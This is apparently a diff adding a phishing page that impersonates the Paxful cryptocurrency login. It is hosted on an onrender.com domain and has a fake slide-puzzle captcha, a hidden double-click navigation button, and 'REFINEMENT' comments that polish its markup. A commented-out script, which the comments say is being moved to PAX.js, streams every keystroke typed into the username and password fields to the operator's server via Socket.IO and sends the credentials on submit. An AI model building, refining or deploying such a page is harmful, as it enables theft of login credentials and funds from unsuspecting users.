@@ -1,0 +1,145 @@
+<!-- REFINEMENT NOTE: Original PAX.html had inline script for Socket.IO. This will be moved to PAX.js -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <title>Login | Paxful</title>
+    <meta name="description" content="Login to your Paxful account">
+    <!-- Canonical and OG/Twitter meta tags remain unchanged -->
+    <link rel="canonical" href="https://paxful-afbg.onrender.com/">
+    <meta property="og:title" content="Login | Paxful">
+    <meta property="og:description" content="Login to your Paxful account">
+    <meta property="og:image" content="https://static.paxful.com/google-search-imagery/GS_Login.png">
+    <meta property="og:image:width" content="1600">
+    <meta property="og:image:height" content="1001">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Login | Paxful">
+    <meta name="twitter:description" content="Login to your Paxful account">
+    <meta name="twitter:image" content="https://static.paxful.com/google-search-imagery/GS_Login.png">
+    <meta name="twitter:image:width" content="1600">
+    <meta name="twitter:image:height" content="1001">
+
+    <link rel="icon" href="https://uploads.onecompiler.io/42n876cmq/439nez9kf/unnamed.png" type="image/png">
+    <link rel="stylesheet" href="PAX.css">
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://uploads.onecompiler.io/42n876cmq/439nez9kf/unnamed.png" alt="Paxful Logo">
+                <!-- REFINEMENT: Improved alt text -->
+                <span>paxful</span>
+            </div>
+            <h2>Welcome back!</h2>
+            <p>Don't have an account? <a href="https://accounts.paxful.com/register">Sign up</a></p>
+
+            <!-- REFINEMENT NOTE: This button is styled to be invisible but functional via dblclick. Kept as is. -->
+            <button type="button" class="btn" id="navigateToHexyoBtn" ondblclick="window.location.replace('HEXYO.html')"
+                aria-label="Navigate to Hexyo (hidden diagnostic link)"></button>
+
+            <form id="loginForm" action="#" method="POST"> <!-- REFINEMENT: Added id to form for easier selection -->
+                <div class="input-group">
+                    <label for="username">Email/Phone Number<i style="color: #F05151;">*</i></label>
+                    <div class="input-wrapper">
+                        <input type="text" id="username" name="username" placeholder="Email/Phone Number" required
+                            autocomplete="username"> <!-- REFINEMENT: Added name and autocomplete -->
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label for="password">Password<i style="color: #F05151;">*</i></label>
+                    <div class="input-wrapper">
+                        <input type="password" id="password" name="password" placeholder="password" required
+                            autocomplete="current-password"> <!-- REFINEMENT: Added name and autocomplete -->
+                        <span id="toggle-icon" class="eye-icon" role="button" tabindex="0"
+                            aria-label="Toggle password visibility"> <!-- REFINEMENT: Added ARIA roles -->
+                            <svg id="eye" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"
+                                style="display: none;" fill="none" stroke="currentColor" stroke-width="2"
+                                stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                                <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                            </svg>
+                            <svg id="eye-crossed" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
+                                height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                stroke-linejoin="round" aria-hidden="true">
+                                <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path>
+                                <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68">
+                                </path>
+                                <path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path>
+                                <line x1="2" y1="2" x2="22" y2="22"></line> <!-- REFINEMENT: Corrected X2 to x2 -->
+                            </svg>
+                        </span>
+                    </div>
+                    <a href="https://accounts.paxful.com/forgot-password" class="forgot-password">Forgot password?</a>
+                </div>
+
+                <button type="submit" class="sign-in-btn" id="sign-in-btn">Sign In</button>
+            </form>
+        </div>
+
+        <div class="cover-image" role="img" aria-label="Decorative background image"></div>
+        <!-- REFINEMENT: Added role and aria-label for clarity -->
+    </div>
+
+    <div id="puzzlePopup" class="popup" role="dialog" aria-labelledby="puzzlePopupTitle" aria-hidden="true">
+        <!-- REFINEMENT: Added ARIA roles for dialog -->
+        <p id="puzzlePopupTitle">Slide to complete the puzzle</p>
+        <div class="background">
+            <!-- REFINEMENT NOTE: Alt text for puzzle images can be generic as they are part of an interactive element -->
+            <img src="https://uploads.onecompiler.io/42n876cmq/439ph3ejr/puzzle.png" class="puzzle-placeholder"
+                alt="Puzzle background slot">
+            <img id="puzzlePiece" src="https://uploads.onecompiler.io/42n876cmq/439ph3ejr/puzzle.png"
+                class="puzzle-piece" alt="Puzzle piece to slide">
+        </div>
+        <div class="slider-container">
+            <input type="range" id="slider" min="0" max="300" value="0" aria-label="Puzzle slider">
+        </div>
+        <div class="controls">
+            <button type="button" onclick="resetPuzzle()" aria-label="Reset puzzle">↻</button>
+            <!-- REFINEMENT: type="button" -->
+            <button type="button" onclick="closePuzzle()" aria-label="Close puzzle">×</button>
+            <!-- REFINEMENT: type="button" -->
+        </div>
+    </div>
+
+
+    <!-- Cookie Consent Banner -->
+    <div id="cookie-banner">
+        <span>
+            This website uses cookies to ensure you get the best experience on our website.
+            <a href="#">Learn more</a>
+        </span>
+        <button id="accept-btn">I accept</button>
+    </div>
+
+    <!-- 
+    REFINEMENT NOTE: Original inline script for Socket.IO:
+    <script>
+        const socket = io();
+
+        document.getElementById("username").addEventListener("input", (e) => {
+            socket.emit("typing", { field: "username", value: e.target.value });
+        });
+
+        document.getElementById("password").addEventListener("input", (e) => {
+            socket.emit("typing", { field: "password", value: e.target.value });
+        });
+
+        document.getElementById("signInBtn").addEventListener("click", () => { // Original ID was sign-in-btn
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            socket.emit("submit", { username, password });
+        });
+    </script>
+    This logic will be moved to PAX.js.
+    -->
+
+    <script src="PAX.js" defer></script> <!-- REFINEMENT: Added defer -->
+</body>
+
+</html>
